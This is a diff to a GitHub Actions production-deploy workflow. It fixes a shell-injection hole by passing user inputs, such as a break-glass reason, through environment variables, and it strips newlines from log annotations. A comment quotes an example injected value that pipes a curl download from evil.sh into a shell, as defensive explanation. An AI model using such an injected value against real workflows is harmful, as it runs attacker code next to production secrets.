@@ -62,15 +62,43 @@ jobs:
 
     steps:
       - name: Audit trail — who/what/why
+        # Hardening A final repair (2026-09-10), P0: `inputs.break_glass_reason`
+        # is free-text supplied by whoever triggers break-glass-production-
+        # deploy.yml — a repo-write-access user, not necessarily trusted with
+        # arbitrary code execution in a job that holds production SSH/deploy
+        # secrets. The OLD version of this step interpolated
+        # `${{ inputs.break_glass_reason }}` (and several other `${{ }}`
+        # expressions) directly into the run: script text — GitHub Actions
+        # substitutes `${{ }}` BEFORE the shell ever parses the script, so a
+        # reason like `"; curl evil.sh | sh #` would have become literal shell
+        # source, not data. Every value below is passed through `env:` instead:
+        # env-var expansion happens at shell RUNTIME via `$VAR`, so the value is
+        # always treated as data, never re-parsed as script, no matter what
+        # metacharacters it contains. See
+        # tests/test_deploy_workflow_static_validation.py's
+        # test_no_break_glass_reason_is_ever_interpolated_directly_into_a_run_block
+        # for the regression guard, and the hostile-input test matrix in
+        # tests/test_break_glass_shell_injection.py.
+        env:
+          ACTOR: ${{ github.actor }}
+          EVENT_NAME: ${{ github.event_name }}
+          WORKFLOW_NAME: ${{ github.workflow }}
+          DEPLOY_SHA_INPUT: ${{ inputs.deploy_sha }}
+          BREAK_GLASS: ${{ inputs.break_glass }}
+          BREAK_GLASS_REASON: ${{ inputs.break_glass_reason }}
         run: |
           set -euo pipefail
           echo "::notice::Production deploy starting"
-          echo "  actor: ${{ github.actor }}"
-          echo "  triggered_by: ${{ github.event_name }} (via ${{ github.workflow }})"
-          echo "  deploy_sha: ${{ inputs.deploy_sha }}"
-          echo "  break_glass: ${{ inputs.break_glass }}"
-          if [ "${{ inputs.break_glass }}" = "true" ]; then
-            echo "::warning::BREAK-GLASS DEPLOY — reason: ${{ inputs.break_glass_reason }}"
+          echo "  actor: $ACTOR"
+          echo "  triggered_by: $EVENT_NAME (via $WORKFLOW_NAME)"
+          echo "  deploy_sha: $DEPLOY_SHA_INPUT"
+          echo "  break_glass: $BREAK_GLASS"
+          if [ "$BREAK_GLASS" = "true" ]; then
+            # Defense in depth beyond env:/$VAR (already closes code-execution
+            # injection): collapse embedded newlines so the reason can't spoof
+            # a fake ::error::/::warning:: annotation in the Actions log.
+            REASON_SAFE="${BREAK_GLASS_REASON//$'\n'/ }"
+            printf '::warning::BREAK-GLASS DEPLOY — reason: %s\n' "$REASON_SAFE"
           fi
 
       - name: Checkout exact commit that passed release gate
